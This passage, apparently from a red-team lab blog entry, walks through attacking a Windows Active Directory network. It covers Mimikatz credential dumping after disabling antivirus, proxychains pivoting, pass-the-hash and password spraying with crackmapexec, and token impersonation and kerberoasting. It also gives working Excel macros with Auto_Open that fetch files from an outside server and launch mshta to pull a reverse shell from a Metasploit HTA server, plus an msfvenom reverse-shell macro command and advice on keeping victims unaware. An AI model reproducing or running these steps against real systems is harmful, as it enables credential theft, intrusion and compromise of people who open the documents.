href="#Mimikatz-Overview" class="headerlink" title="Mimikatz Overview"></a>Mimikatz Overview</h1><p>Mimikatz is one of the most famous tools used for dumping passwords on Windows systems. It can be used to dump passwords on both a Windows Server and mainstream Windows versions. However, with its fame, it’s patterns are incredibly recognizable and are almost immediately picked up by all Anti-Virus or Anti-Malware services. So you must disable endpoint protection before attempting to use Mimikatz or utilize an obfuscated version mimikatz with a C2. Mimikatz has many modules available and is being actively supported and updated. Here is the list of supported modules</p><ul><li>   log</li><li>   privilege</li><li>   sekurlsa</li><li>   lsadump</li><li>   crypto</li><li>   vault</li><li>   token</li><li><pre><code>misc</code></pre></li><li>and many more</li></ul><p>We will only be utilizing four of the modules for the lab, privilege, token, lsadump, and sekurlsa; however, mimikatz has a lot more modules and can be used more extensively.</p><h2 id="Gaining-Privilege"><a href="#Gaining-Privilege" class="headerlink" title="Gaining Privilege"></a>Gaining Privilege</h2><p>Once endpoint protection is disabled, you’ll then be able to launch Mimikatz (with an Administrative Level User), you’ll want to type privilege::debug which will then put you in Debug mode, a mode that can only be granted by an Administrator. From there, we will want to elevate privileges to NT Authority (if you don’t have it already) with token::elevate. This will grant you the highest level access that Microsoft has to offer, which will allow you to do basically anything on the system. It’s close to the Root user account in Linux.</p><blockquote><p>privilege::debug<br>token::elevate </p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/BQvT2Db.png"></div><blockquote><p>Checking privileges  and elevating privileges with mimikatz</p></blockquote><h2 id="Dumping-Password-Hashes"><a href="#Dumping-Password-Hashes" class="headerlink" title="Dumping Password Hashes"></a>Dumping Password Hashes</h2><p>Mimikatz has a few options for dumping password hashes on Non-DC Endpoints well only be covering a few of the many commands and modules Mimikatz has. Mimikatz has a general template syntax most commands have the Mimikatz module first, followed by two colons, the command to be run, and any parameters that need to be specified at the end. for example</p><pre><code>lsadump::lsa /patch</code></pre><blockquote><p> lsadump is the mimikatz module itself<br>    lsa is the command within the module<br>    /patch is a specific parameter to patch something in this case a particular dll</p></blockquote><pre><code>sekurlsa::tickets /export</code></pre><blockquote><p>sekurlsa is the mimikatz module<br>    tickets is the command withing the module<br>    /export is the parameter to export the tickets to the host</p></blockquote><h4 id="Dumping-from-LSA"><a href="#Dumping-from-LSA" class="headerlink" title="Dumping from LSA"></a>Dumping from LSA</h4><p>The LSA (Local Security Authority) also handles credentials used by the system, from everything to basic password changes to creation of access tokens, it’s another ideal candidate for us to dump hashes from. The output is not as large as lsadump::lsa which makes it much easier to work with.</p><pre><code>lsadump::lsa /patch    </code></pre><h4 id="Dumping-SAM-Hashes"><a href="#Dumping-SAM-Hashes" class="headerlink" title="Dumping SAM Hashes"></a>Dumping SAM Hashes</h4><p>The SAM (Security Account Manager) holds a copy of all the user’s passwords which makes it a valuable file for us to dump. The output can be convoluted and large, so you should transport it onto your Kali machine for further analysis.</p><pre><code>lsadump::sam </code></pre><h4 id="Dumping-Creds-from-Logged-In-Users"><a href="#Dumping-Creds-from-Logged-In-Users" class="headerlink" title="Dumping Creds from Logged In Users"></a>Dumping Creds from Logged In Users</h4><p>Another method of attacking lsass through Mimikatz is with the sekurlsa module. It will attempt to retrieve the credentials/hashes of currently logged in users. This being the least preferred method for dumping credentials in Mimikatz.</p><pre><code>sekurlsa::logonPasswords </code></pre><h2 id="Loading-Mimikatz-with-Starkiller"><a href="#Loading-Mimikatz-with-Starkiller" class="headerlink" title="Loading Mimikatz with Starkiller"></a>Loading Mimikatz with Starkiller</h2><p>Starkiller offers 16 different modules for utilizing mimikatz. Most of them are specific to one mimikatz module such as powershell/credentials/mimkatz/silver_tickets. Empire also has a module that can run any mimikatz module and command the Empire module for it is powershell/credentials/mimikatz/command. We will be utilizing the command module however the other modules have the same functionality.</p><p>1.) Navigate to the interaction menu of an agent.<br>2.) Select powershell/credentials/mimikatz/command<br>3.) Insert the command that you want to execute with mimikatz for example privilege::debug    </p><div style="text-align:center">    <img src="https://i.imgur.com/l9R1Ez4.png"></div><blockquote><p>Loading the mimikatz command module in Starkiller</p></blockquote><p>4.) submit</p><blockquote><p>Checking privileges with mimikatz in Starkiller</p></blockquote><h2 id="Dumping-the-World-with-Mimikatz"><a href="#Dumping-the-World-with-Mimikatz" class="headerlink" title="Dumping the World with Mimikatz"></a>Dumping the World with Mimikatz</h2><p>We can utilize all commands within mimikatz from the module. We can dump logged in users passwords to gather a password or hash to authenticate or pass the hash with.<br>1.) Select powershell/credentials/mimkatz/command<br>2.) sekurlsa::logonPasswords    </p><div style="text-align:center">    <img src="https://i.imgur.com/4ALAx6O.png"></div><blockquote><p>Dumping Login Passwords with mimikatz<br>3.) Easily find organized credentials in the Credentials tab</p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/zdhmGgh.png"></div><blockquote><p>Starkiller organize credentials in the Credentials tab</p></blockquote><h1 id="Pivoting-Overview"><a href="#Pivoting-Overview" class="headerlink" title="Pivoting Overview"></a>Pivoting Overview</h1><p>In a good network, often referred to as a “Segmented Network” there are certain rules in place preventing users from accessing certain parts of the Internal LAN (ex. The Workstation Subnet should not be able to access the Server Subnet). This can be a headache for Pentesters on occasion as most networks are not segmented, these networks are referred to as “Flat Networks”. To make Segmented Networks more like flat networks there are a proxying tools such as Proxychains or SSHuttle which make it incredibly easy to pivot from one subnet in a LAN to another. Metasploit offers a Proxy server as part of its Post Exploitation tool suite which will be covered below.</p><h2 id="Introduction-to-Pivoting-with-proxychains"><a href="#Introduction-to-Pivoting-with-proxychains" class="headerlink" title="Introduction to Pivoting with proxychains"></a>Introduction to Pivoting with proxychains</h2><h3 id="Auto-Routing-our-Traffic"><a href="#Auto-Routing-our-Traffic" class="headerlink" title="Auto-Routing our Traffic"></a>Auto-Routing our Traffic</h3><p>To setup a proxy server you will need a meterpreter session or a reverse shell open in metasploit before hand. You can easily get a meterpreter shell by uploading a payload to the machine and executing it.<br>1.) background<br>2.) use post/multi/manage/autoroute<br>3.) set SESSION 1<br>4.) set SUBNET 10.200.x.0</p><div style="text-align:center">    <img src="https://i.imgur.com/zYyPFzM.png"></div><blockquote><p>Listing the configured options for autoroute</p></blockquote><p>5.) exploit</p><div style="text-align:center">    <img src="https://i.imgur.com/9PEqkGd.png"></div><blockquote><p>Launching our new autoroute</p></blockquote><h3 id="Setting-up-our-Proxy-with-Metasploit"><a href="#Setting-up-our-Proxy-with-Metasploit" class="headerlink" title="Setting up our Proxy with Metasploit"></a>Setting up our Proxy with Metasploit</h3><p>1.) use auxiliary/server/socks4a<br>2.) (optional) Change you port, you can either keep the default 1080 port or change it to an open port of your choice.</p><h2 id="Configuring-and-Using-the-Proxy-Chain"><a href="#Configuring-and-Using-the-Proxy-Chain" class="headerlink" title="Configuring and Using the Proxy Chain"></a>Configuring and Using the Proxy Chain</h2><p>1.) sudo nano /etc/proxychains.conf<br>You will need to comment out the socks4 proxy on 9050 which is a default proxy for tor and add the proxy chain we just created with the port that you gave when creating the proxies.</p><div style="text-align:center">    <img src="https://i.imgur.com/IIJ6kxd.png"></div><blockquote><p>Adding our Socks4a server to the proxychains configuration file</p></blockquote><p>2.) proxychains <command>    </p><p>You can now run any normal commands or tools that you want and it will be forwarded through the proxy chain if you append your tool or command with “proxychains”.</p><div style="text-align:center">    <img src="https://i.imgur.com/FYwSjnA.png"></div><blockquote><p>An example of running a command through proxy chains</p></blockquote><h3 id="Pivoting-with-proxychains"><a href="#Pivoting-with-proxychains" class="headerlink" title="Pivoting with proxychains"></a>Pivoting with proxychains</h3><p>Pivoting may seem like a very big and scary thing but it is actually fairly simple after you have your proxy server set up. After setting up the proxy server you can pivot to any machines or resources that the proxy server has access to. For example if you had a proxy server on example-ws01 and example-ws02 was segmented by a security groups that made it so only example-ws01 had access you could use your proxy server on example-ws01 to access example-ws02. You can use any way of accessing the machine that you would usually like ssh, rdp, win-rm, psexec you just have to prepend the command with proxychains.<br>Examples of pivoting</p><pre><code class="bash=">proxychains ssh user@MACHINE_IPproxychains xfreerdp /u:user /p:password /v:MACHINE_IPproxychains evil-winrm -i MACHINE_IP -u user -p password    </code></pre><h3 id="Setting-up-a-Web-Proxy-with-FoxyProxy"><a href="#Setting-up-a-Web-Proxy-with-FoxyProxy" class="headerlink" title="Setting up a Web Proxy with FoxyProxy"></a>Setting up a Web Proxy with FoxyProxy</h3><p>Now that we have a proxy setup to forward our traffic through we need a way to easily access the resources on the network. Let’s add an extension to our web browser to allow us to easily route our traffic through it! For this room, we’ll be using ‘FoxyProxy Standard’ on firefox.<br>1.) Click on FoxyProxy among your extensions. After that, click on ‘Options’, Then click on ‘Add’.<br>2.) Enter in the following setting you will need to fill in the title, proxy type (SOCKS4), Proxy IP, and Port then click ‘Save’. </p><div style="text-align:center">    <img src="https://i.imgur.com/k4Ltvz2.png"></div><blockquote><p>FoxyProxy add proxy menu</p></blockquote><p>3.) Click on Foxy Proxy in your extensions and enable the web proxy.</p><h1 id="Pass-the-Hash-Overview"><a href="#Pass-the-Hash-Overview" class="headerlink" title="Pass the Hash Overview"></a>Pass the Hash Overview</h1><p>Pass the hash (PtH) is an attack wherein we can leverage found NTLM or LanMan hashes of user passwords in order to successfully authenticate as the user they belong to. This is possible due to well-intentioned security ‘feature’ within Windows where passwords, prior to being sent over the network, are hashed in a predictable manner. Done originally with the intent of avoidance of password disclosure, we can leverage this feature to capture and replay hashes, allowing us to authenticate as our victim users. In this section, we’ll dig into this further with the tool crackmapexec.</p><h2 id="Installing-crackmapexec"><a href="#Installing-crackmapexec" class="headerlink" title="Installing crackmapexec"></a>Installing crackmapexec</h2><pre><code class="bash=">sudo apt install crackmapexec    </code></pre><h3 id="Conquering-Hashes-with-crackmapexec"><a href="#Conquering-Hashes-with-crackmapexec" class="headerlink" title="Conquering Hashes with crackmapexec"></a>Conquering Hashes with crackmapexec</h3><p>1.) Configure proxychains to the proxy server that will be sending your requests. You will need a proxy server to pivot to the other machines and bypass segmentation. You can also utilize sshuttle as a proxy server to pivot.</p><pre><code class="bash=">proxychains crackmapexec smb 10.200.x.0/24 -u &lt;user&gt; -d &lt;domain&gt; -H &lt;hash&gt;   ```&lt;div style=&quot;text-align:center&quot;&gt;    &lt;img src=&quot;https://i.imgur.com/BaHlmpP.png&quot;&gt;&lt;/div&gt;&gt; Success! We got a hit passing the hash!To continue on you can either use the hashes from mimikatz or cracked passwords from Task 10 to pass the hash then access the device(s). To access the device(s) you can either use the hashes with evil-winrm or you can attempt to crack the hashes and use ssh or rdp.# Enumeration with BloodhoundBloodhound is a graphical interface that allows you to visually map out the network using database visualization from neo4j. Bloodhound along with Sharphound or any bloodhound ingestor takes the user, groups, trusts and more of a domain and collects them into .json files and created a graphical database in neo4j to view information of the network. Well be focusing on how to collect the .json files and import them into Bloodhound, then make basic and custom queries in neo4j## Bloodhound Installation```bash=sudo apt install bloodhound neo4j console</code></pre><blockquote><p>default credentials:<br>    user:neo4j<br>    pass:neo4j    </p></blockquote><h2 id="Getting-Loot-with-Sharphound"><a href="#Getting-Loot-with-Sharphound" class="headerlink" title="Getting Loot with Sharphound"></a>Getting Loot with Sharphound</h2><p><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p><p>From your host machine</p><pre><code class="python="># From your host machinepython3 -m http.server    </code></pre><pre><code class="bash="># From the target devicewget tun0_IP:8000/Sharphound.ps1 -outfile Sharphound.ps1    powershell -ep bypass. .\Sharphound.ps1#    or Import-Module .\Sharphound.ps1    Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip </code></pre> <div style="text-align:center">    <img src="https://i.imgur.com/UPR2l51.png"></div><blockquote><p>Launching Sharphound to enumerate domain information</p></blockquote><p>Mapping the Network with Bloodhound </p><pre><code>1.) scp loot.zip @10.200.x.222:/Users/Administrator/Downloads/loot.zip    2.) sudo neo4j console3.) bloodhound    4.) Sign into Bloodhound using the same credentials you set with neo4j.</code></pre><div style="text-align:center">    <img src="https://i.imgur.com/2xvEvIq.png"></div><blockquote><p>Bloodhound login panel</p></blockquote><p>5.) In Bloodhound look for the ‘upload data’ icon / text and upload the json files / zip folder.<br>6.) To view the graphed network open the menu and select queries this will you a list of pre-compiled queries to choose from.</p><div style="text-align:center">    <img src="https://i.imgur.com/bQRNJZ1.png"></div><blockquote><p>Selecting the ‘Queries’ sub-menu in Bloodhound</p></blockquote><p>Bloodhound has many queries to utilize such as ‘find all domain admins’.</p><p>There are many pre-built queries to utilize that can help enumerate a domain.</p><div style="text-align:center">    <img src="https://i.imgur.com/pgL3508.png"></div>> Pre-built queries within Bloodhound<h1 id="Malicious-Macros-Overview"><a href="#Malicious-Macros-Overview" class="headerlink" title="Malicious Macros Overview"></a>Malicious Macros Overview</h1><p>Picture this, you are a manager for one of the top accounting firms in the United States. As you walk across the floor, you notice one thing in common: Every device has the Microsoft Office suite installed. This shouldn’t be any surprise to you, as reported in Microsoft’s 2019 Annual report, Office 365 (Commercial) has 180 million users. For an attacker, this is an extremely large attack surface. As an attacker, all you need to do is get one person to click on an Excel/Office document, and they could be the downfall of an organization.<br>Source: <a href="https://www.microsoft.com/investor/reports/ar19/index.html">https://www.microsoft.com/investor/reports/ar19/index.html</a></p><h2 id="Creating-a-Simple-Macro"><a href="#Creating-a-Simple-Macro" class="headerlink" title="Creating a Simple Macro"></a>Creating a Simple Macro</h2><p>To start, you’ll want to register an account with Microsoft, then download and install Office to your lab machine.</p><p>After installed, start Excel and create a new workbook and head over to the “View” tab.</p><p>Within there, you will find a section called “Macros”, Clicking the button will display a drop-down menu where you will have the option to create a new Macro. Click “Create New Macro”, you should see a new window open.</p><div style="text-align:center">    <img src="https://i.imgur.com/1fKxKgw.png"></div><blockquote><p>Microsoft Excel with the Macro Creation Window Open</p></blockquote><p>You can name your new Macro whatever you like. It’s important to know that later, the Macro name is not just an arbitrary value. It can add some additional functions, and do some special things that will help us later. After entering a name for the Macro, and clicking “Create” you should see a new window open that looks very different from Excel’s normal interface.</p><div style="text-align:center">    <img src="https://i.imgur.com/FlBJ1yt.png"></div><blockquote><p>Microsoft’s Visual Basic Macro Editor</p></blockquote><p>This is Microsoft’s Visual Basic Macro Creator/Editor. This is where we will eventually create our Malicious Macro. Here, we can write visual basics to perform actions, even execute OS commands. For example, we can use:<br><em>PID = Shell(“powershell.exe -c Invoke-WebRequest -Uri <a href="https://192.168.125.1/shadow">https://192.168.125.1/shadow</a> -OutFile C:\Shadow”, vbNormalFocus)</em><br>This will connect out to a remote server and download the file “Shadow” and save it to the root of the file system as a file called “Shadow” (How creative).</p><div style="text-align:center">    <img src="https://i.imgur.com/ciHFb0w.png"></div><blockquote><p>A Python HTTP Server Listening with a Macro to Call Out to it</p></blockquote><p>Let’s say we wanted to step it up a notch and require the user to not interact with the Macro to trigger the remote connection to the HTTP Server, is this possible? If so, how can we do it?<br>It turns out, the answer is “Yes, (onto the) Next Question” and “Very easily”. To make a Macro execute on the document opening, we can add a useful “Sub” called “Auto_Open”. Upon document opening, whatever is in that Sub will be run, in this scenario, I’ll call the HelloWorld Sub upon document opening with the following code below.</p><div style="text-align:center">    <img src="https://i.imgur.com/EHcuEDa.png"></div><blockquote><p>Adding our malicious PowerShell code to the macro</p></blockquote><p>Code Below:</p><pre><code class="c=">Sub HelloWorld()    PID = Shell(&quot;powershell.exe -c Invoke-WebRequest -Uri https://192.168.125.1/passwd -OutFile C:\passwd&quot;, vbNormalFocus)End SubSub Auto_Open()    HelloWorldEnd Sub</code></pre><p>After saving this document as an xlsm (Excel Macro-Enabled Document) and upon reopening it, we should see a call out to our remote web server attempting to retrieve the file “passwd”.</p><div style="text-align:center">    <img src="https://i.imgur.com/Wap8X4Z.png"></div><blockquote><p>Microsoft Excel Prompting the User to Accept Use of Macros</p></blockquote><h2 id="Creating-a-Malicious-Macro"><a href="#Creating-a-Malicious-Macro" class="headerlink" title="Creating a Malicious Macro"></a>Creating a Malicious Macro</h2><p>Now that you are more familiar with creating a Macro and utilizing the Auto_Open feature within Office Products, we can dive into creating and generating malicious Macros.</p><p>First, we will start off by manually creating a macro. We will be re-using the code from the previous section as our base, and we will also be utilizing Metasploit’s HTA Server to gain a reverse shell. </p><p>To set up Metasploit’s HTA Server for payload delivery you will need to use the module exploit/windows/misc/hta_server as seen in the screenshot below:</p><div style="text-align:center">    <img src="https://i.imgur.com/nDCEVUJ.png"></div><blockquote><p>Starting Metasploit’s HTA Server for Remote Payload Delivery</p></blockquote><p>The URL containing the “Local IP” (In this case: <em><a href="https://192.168.100.128:8080/c94O6fz.hta">https://192.168.100.128:8080/c94O6fz.hta</a></em>) is the server that will deliver the payload to the unsuspecting victim. At the moment, we only have a URL that will deliver a payload, so how does this get executed on the machine?<br>Simply reaching out to the remote server won’t cause the payload to fire, because it’s not an executable (It’s a .hta). We can use mshta.exe (A built-in executable on Windows devices that’s used to aid in script execution with HTML applications) to execute the file on the remote server and return a shell. You can do this by calling mshta.exe followed by the URL of the Payload Delivery server, ex. <em><a href="https://192.168.100.128:8080/c94O6fz.hta">https://192.168.100.128:8080/c94O6fz.hta</a></em>, so the full command would look as follows.<br>mshta.exe <em><a href="https://192.168.100.128:8080/c9406fx.hta">https://192.168.100.128:8080/c9406fx.hta</a></em><br>If we simply change our previous command in our “Hello World” Macro from Invoke-WebRequest to the command above (Remember, your IP address will be different), we will have a reverse shell returned</p><div style="text-align:center">    <img src="https://i.imgur.com/JZJzByO.png"></div><blockquote><p>The Updated Hello World Macro with mshta.exe being executed</p></blockquote><pre><code class="c=">Sub HelloWorld()    PID = Shell(&quot;mshta.exe https://192.168.100.128:8080/c9496fz.hta&quot;)End SubSub Auto_Open()    HelloWorldEnd Sub</code></pre><p>If we run the script Macro now, we should see mshta.exe reach out to our Payload server and successfully deliver the payload.</p><h2 id="Generating-Macros-with-msfvenom"><a href="#Generating-Macros-with-msfvenom" class="headerlink" title="Generating Macros with msfvenom"></a>Generating Macros with msfvenom</h2><p>Alternatively, you can use msfvenom to create Malicious Macros, the syntax is much simpler, all you need to do is the following:</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba    </code></pre><p>The above command will generate a Visual Basic Macro that will execute a reverse shell, your output will look something like so and will go directly into your Macro.</p><div style="text-align:center">    <img src="https://i.imgur.com/etozskG.png"></div><blockquote><p>Utilizing MSFVenom to Generate a Malicious Macro</p></blockquote><p>You will need to take the given visual basic macro from MSFVenom and paste it into the excel macro editor.</p><div style="text-align:center">    <img src="https://i.imgur.com/lJH1fQo.png"></div><blockquote><p>The Macro Pasted into Microsoft’s Visual Basic Macro Editor.</p></blockquote><blockquote><p><strong>Note</strong>: This is only an alternative to show theory behind malicious macros. There is Anti-Virus enabled on the box and we highly recommend that you take the HTA server route for creating a malicious macro.</p></blockquote><h3 id="Sending-off-the-Malicious-Macro"><a href="#Sending-off-the-Malicious-Macro" class="headerlink" title="Sending off the Malicious Macro"></a>Sending off the Malicious Macro</h3><p>After setting up exploit/multi/handler to catch the Reverse Shell, we are ready to have the end-user open the Document.</p><div style="text-align:center">    <img src="https://i.imgur.com/IEG4q2G.png"></div><blockquote><p>Utilizing Metasploit’s exploit/multi/handler to catch a Reverse Shell</p></blockquote><div style="text-align:center">    <img src="https://i.imgur.com/etclAOG.png"></div><blockquote><p>Compromising the Target System with the use of Malicious Macros</p></blockquote><p>Success, our payload successfully fired, the end-user has absolutely no knowledge that we have compromised their system. If you attempt to use this in the real world (with Authorization of course), it’s ideal that you populate the spreadsheet with actual data. Opening up a spreadsheet/document with absolutely no data is a quick way to raise some alarms.</p><h2 id="Finding-an-Attack-Vector"><a href="#Finding-an-Attack-Vector" class="headerlink" title="Finding an Attack Vector"></a>Finding an Attack Vector</h2><p>Attempting to find an attack vector to successfully utilize Malicious Macros may be difficult at first, the trick is asking yourself “Is a human going to read this?”. If you answer “Yes”, it’s worth attempting this attack. You should be cautious when using this attack because you never know who’s inbox it might end up in. The last thing you want is IT aware of your presence on the network…</p><h1 id="Password-Spraying-with-crackmapexec"><a href="#Password-Spraying-with-crackmapexec" class="headerlink" title="Password Spraying with crackmapexec"></a>Password Spraying with crackmapexec</h1><p>Password spraying with crackmapexec is much easier than password spraying a login portal with hydra. To password spray domain users with crackmapexec you will first have to format your user list similar to how you formatted it with hydra. After formatting our user list we can use crackmapexec to password spray across the domain and gain access to domain accounts.<br>We can not only use the user list we got from the database or namely but we can also use a custom password list rather than spraying one password at a time.</p><pre><code class="bash=">proxychains crackmapexec smb 10.200.x.117 -u users.txt -p passes.txt    </code></pre><p>When running the password spray make sure to tunnel it through proxychains or it cannot validate with the domain controller.</p><h1 id="Domain-Trusts-Overview"><a href="#Domain-Trusts-Overview" class="headerlink" title="Domain Trusts Overview"></a>Domain Trusts Overview</h1><p>Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.</p><div style="text-align:center">    <img src="https://i.imgur.com/E5ACM1d.png"></div><blockquote><p>Trusts forest visual</p></blockquote><p>There are two types of trusts that determine how the domain communicate. Find an outline of the trusts below.</p><ul><li>Directional - The direction of the trusts flows from a trusting domain to a trusted domain.</li><li>Transitive - The trust relationship expands beyond just two domains to include other trusted domains.<br>The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network.</li></ul><h2 id="Hunting-for-an-Attack-Surface"><a href="#Hunting-for-an-Attack-Surface" class="headerlink" title="Hunting for an Attack Surface"></a>Hunting for an Attack Surface</h2><p>We can utilize either offensive powershell or bloodhound, both give the same amount of information however they give different ways of presenting the data. Utilize powerview or bloodhound to enumerate the trusts within the network.</p><h2 id="Crossing-the-Trust"><a href="#Crossing-the-Trust" class="headerlink" title="Crossing the Trust"></a>Crossing the Trust</h2><p>We can utilize a trust just like there was a user on the domain controller itself. The second domain will authenticate with the primary domain controller to allow access to the server. </p><p>Options to pivot across the trust</p><pre><code>proxychains ssh MercerH@10.200.x.118proxychains xfreerdp /u:MercerH /p:&#39;&lt;password&gt;&#39; /v:10.200.x.118</code></pre><h1 id="Token-Delegation-Overview"><a href="#Token-Delegation-Overview" class="headerlink" title="Token Delegation Overview"></a>Token Delegation Overview</h1><p>Similar to web cookies, token are temporary keys that allow for sessions to be ‘remembered’ for periods of time, rather than requiring reauthentication at every instance of accessing a network service or system. These tokens persist until reboot, allowing for incredible shenanigans, especially on rarely rebooted domain controllers such as domain controllers. Originally a stand-alone program, Incognito is bundled-in with the meterpreter shell, allowing for us to use saved tokens as we please once we have a meterpreter session. In this section, we’ll explore how to abuse these tokens further with Incognito. </p><h1 id="Going-Incognito-with-Metasploit"><a href="#Going-Incognito-with-Metasploit" class="headerlink" title="Going Incognito with Metasploit"></a>Going Incognito with Metasploit</h1><p>After gaining a meterpreter shell on a target you can load the incognito extension in Metasploit to view and manage tokens as well as impersonate tokens to escalate privileges.<br>1.) use incognito<br>2.) list_tokens -u    </p><div style="text-align:center">    <img src="https://i.imgur.com/XkZzsn9.png"></div><h1 id="Impersonating-Tokens-with-Incognito"><a href="#Impersonating-Tokens-with-Incognito" class="headerlink" title="Impersonating Tokens with Incognito"></a>Impersonating Tokens with Incognito</h1><p>1.) list_tokens -u    </p><div style="text-align:center">    <img src="https://i.imgur.com/Zyp79xr.png"></div><blockquote><p>Listing available tokens with incognito</p></blockquote><p>2.) impersonate_token <token> </p><div style="text-align:center">    <img src="https://i.imgur.com/Gsmi7qK.png"></div>> Impersonating the NT AUTHORITY\SYSTEM token<h1 id="Automating-Kerberos-Abuse-with-Rubeus"><a href="#Automating-Kerberos-Abuse-with-Rubeus" class="headerlink" title="Automating Kerberos Abuse with Rubeus"></a>Automating Kerberos Abuse with Rubeus</h1><p>To use Rubeus to automate kerberoasting we can either compile and transfer a binary onto the target machine however this will get picked up by AV or you can use a C2 to load Rubeus and execute commands from the C2 agent.</p><h2 id="Loading-Rubeus-with-Starkiller"><a href="#Loading-Rubeus-with-Starkiller" class="headerlink" title="Loading Rubeus with Starkiller"></a>Loading Rubeus with Starkiller</h2><p>You will first need to generate a stager in Starkiller to transfer to the domain controller and get a starkiller agent on the domain controller.<br>Starkiller already comes precompiled with a Rubeus module so it’s as easy as selecting the module in your agent menu and running the module.<br>The module for Rubeus is powershell/credentials/rubeus. The only parameter that is needed is the command to run, to find out more about all of Rubeus check out the official Rubeus </p><p>1.) kerberoast    </p><div style="text-align:center">    <img src="https://i.imgur.com/fHDR6HT.png"></div><blockquote><p>Loading Rubeus with Starkiller</p></blockquote><p>2.) Press submit and watch rubeus do all the work.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> DirectorioActivo </tag>
            
            <tag> Pivoting </tag>
            
            <tag> RED_TEAM </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
